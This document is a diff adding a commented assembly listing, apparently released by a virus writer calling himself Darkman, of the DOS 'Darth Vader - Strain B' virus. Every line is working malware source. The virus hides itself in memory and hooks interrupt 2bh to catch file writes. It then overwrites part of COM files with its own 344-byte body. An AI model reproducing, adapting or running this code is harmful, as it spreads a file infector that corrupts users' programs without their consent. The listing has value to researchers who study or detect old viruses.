@@ -1,0 +1,182 @@
+;                D     A     R     K     M     A     N
+;                           Proudly Presents
+;                Disassembly Of Darth Vader - Strain B
+
+
+darthvb      segment
+             assume  cs:darthvb,ds:darthvb
+             org     100h                ; Origin of COM-file
+
+code:
+             call    viruscode
+viruscode:
+             pop     si                  ; Load SI from stack
+             sub     si,03h              ; SI = delta offset
+             mov     ds:[0f0h],si        ; DS:[00F0h] = delta offset
+             mov     ds:[0feh],ax        ; Save AX at PSP
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             mov     es,ds:[0aeh]        ; ES = segment of int 2bh
+             mov     ax,9000h
+             mov     ds,ax               ; DS = segment 9000h
+             xor     di,di               ; Clear DI
+locatearea:
+             inc     di                  ; Increase DI
+             cmp     di,0f00h            ; DI = 3840? (DI > 3840)
+             ja      virusexit           ; Greater? Jump to virusexit
+             push    di                  ; Save DI at stack
+             xor     si,si               ; Clear SI
+             mov     cx,158h             ; Compare 344 bytes
+             repz    cmpsb               ; Compare segment 9000h with int 2bh
+             pop     di                  ; Load DI from stack
+             jcxz    installvir          ; Equal? Jump to installvir
+             jmp     locatearea
+installvir:
+             mov     si,cs:[0f0h]        ; SI = delta offset
+             mov     cs:[0f2h],di        ; CS:[00F2h]=offset of int 2bh virus
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     cx,158h             ; Move 344 bytes
+             repz    movsb               ; Move virus to 2bh
+             push    es                  ; Save ES at stack
+             pop     ds                  ; Load DS from stack (ES)
+             mov     si,di               ; SI = offset of int 2bh virus end
+locatemodi:
+             inc     si                  ; Increase SI
+             jz      virusexit           ; SI = 0? Jump to virusexit
+             push    si                  ; Save SI at stack
+             lodsw                       ; Load AX from DS:[SI]
+             xchg    ax,bx               ; Exchange AX with BX
+             lodsb                       ; Load AL from DS:[SI]
+             cmp     bx,0ff36h           ; BX = 65334?
+             jz      modifyint2b         ; Equal? Jump to modifyint2b
+restoreidx:
+             pop     si                  ; Load SI from stack
+             jmp     locatemodi
+modifyint2b:
+             cmp     al,16h              ; AL = 22?
+             jnz     restoreidx          ; Not equal? Jump to restoreidx
+             pop     si                  ; Load SI from stack
+             push    si                  ; Save SI at stack
+             mov     di,cs:[0f2h]        ; DI = offset of int 2bh virus
+             mov     ds:[04h],di         ; Save DI at int 2bh code
+             add     di,141h             ; DI = offset of int2bcode
+             movsw                       ; Move word DS:[SI] to ES:[DI]
+             movsw                       ;  "    "      "    "    "
+             movsb                       ;  "   byte    "    "    "
+             pop     di                  ; Load DI from stack
+             mov     al,9ah              ; AL = object code of call far
+             stosb                       ; Overwrite byte of int 2bh code
+             mov     ax,95h
+             add     ax,cs:[0f2h]        ; AX = offset of vir2bhpart + 3
+             stosw                       ; Overwrite word of int 2bh code
+             mov     ax,es               ; AX = segment of virus
+             stosw                       ; Overwrite word of int 2bh code
+virusexit:
+             push    cs                  ; Save CS at stack
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Save DS at stack (CS)
+             pop     es                  ; Save ES at stack (CS)
+             mov     di,100h
+             push    di                  ; Save DI at stack
+             mov     si,ds:[0f0h]        ; SI = delta offset
+             add     si,147h             ; SI = SI + 327
+             movsw                       ; Move int 20h to beginning of virus
+             movsb                       ;  "   nop     "      "     "    "
+             mov     ax,ds:[0feh]        ; Load AX from PSP
+             ret                         ; Return!
+
+vir2bhpart:
+             jmp     exit2bhvir
+
+; Interrupt 2bh makes a far call to this code:
+
+             mov     cs:[0ah],ds         ; Save DS at int 2bh code
+             mov     cs:[0ch],dx         ; Save DX at int 2bh code
+             mov     cs:[0eh],cx         ; Save CX at int 2bh code
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    es                  ; Save ES at stack
+             push    si                  ; Save SI at stack
+             push    di                  ; Save DI at stack
+             cmp     ah,40h              ; AH = 64? (write to file)
+             jnz     vir2bhpart          ; Not equal? Jump vir2bhpart
+             cmp     cx,168h             ; CX=360? (number of bytes to write)
+             jb      vir2bhpart          ; Less? Jump to vir2bhpart
+             mov     ax,1220h            ; Get system file table number
+             int     2fh                 ; Do it! (multiplex)
+             mov     bl,es:[di]          ; BL = system file table number
+             mov     ax,1216h            ; Get address of system fcb
+             int     2fh                 ; Do it! (multiplex)
+             add     di,28h              ; DI = DI + 40
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     si,14ah
+             add     si,ds:[04h]         ; SI = offset of infectext
+             mov     cx,03h              ; Compare 3 bytes
+             repz    cmpsb               ; Check for infectable extension
+             jnz     exit2bhvir          ; Not equal? Jump to exit2bhvir
+             push    ds                  ; Save DS at stack
+             pop     es                  ; Load ES from stack (DS)
+             mov     ds,cs:[0ah]         ; Load DS from int 2bh code
+             mov     si,cs:[0ch]         ; Load SI from int 2bh code (DX)
+             mov     di,147h
+             add     di,cs:[04h]         ; DI = offset of infectext - 3
+             movsw                       ; Move int 20h to beginning of virus
+             movsb                       ;  "   nop     "      "     "    "
+             mov     ax,9000h
+             mov     es,ax               ; ES = segment 9000h
+             mov     cx,cs:[0eh]         ; Load CX from int 2bh code
+locate2bh:
+             xor     di,di               ; Clear DI
+             inc     si                  ; Increase SI
+             dec     cx                  ; Decrease CX
+             jz      exit2bhvir          ; CX = 0? Jump to exit2bhvir
+             push    cx                  ; Save CX at stack
+             push    si                  ; Save SI at stack
+             mov     cx,158h             ; Compare 344 bytes
+             repz    cmpsb               ; Compare segment 9000h with int 2bh
+             pop     si                  ; Load SI from stack
+             jcxz    modiint2b           ; Equal? Jump to modiint2b
+             pop     cx                  ; Load CX from stack
+             jmp     locate2bh
+modiint2b:
+             pop     cx                  ; Load CX from stack
+             push    si                  ; Save SI at stack
+             push    ds                  ; Save DS at stack
+             mov     es,cs:[0ah]         ; Load ES from int 2bh code (DS)
+             mov     di,cs:[0ch]         ; Load DI from int 2bh code (DX)
+             mov     al,0e9h             ; AL = object code of jump near
+             stosb                       ; Overwrite byte of int 2bh code
+             sub     si,cs:[0ch]         ; SI = SI - DX
+             sub     si,03h              ; SI = SI - 3
+             mov     ax,si
+             stosw                       ; Overwrite word of int 2bh code
+             pop     es                  ; Load ES from stack
+             pop     di                  ; Load DI from stack
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     si,cs:[04h]         ; SI = offset of int 2bh virus
+             mov     cx,158h             ; Move 344 bytes
+             repz    movsb               ; Overwrite real code with virus
+exit2bhvir:
+             pop     di                  ; Load DI from stack
+             pop     si                  ; Load SI from stack
+             pop     es                  ; Load ES from stack
+             pop     cx                  ; Load CX from stack
+             pop     bx                  ; Load BX from stack
+             pop     ax                  ; Load AX from stack
+             mov     dx,cs:[0ch]         ; Load DX from int 2bh code
+             mov     ds,cs:[0ah]         ; Load DS from int 2bh code
+
+int2bcode    db      5 dup(?)            ; Int 2bh's realcode is saved here
+             retf                        ; Return far!
+             int     20h                 ; Exit to DOS!
+             nop
+infectext    db      'COM'               ; Infectable extension
+virusname    db      'Darth Vader'
+             nop
+
+darthvb      ends
+end          code
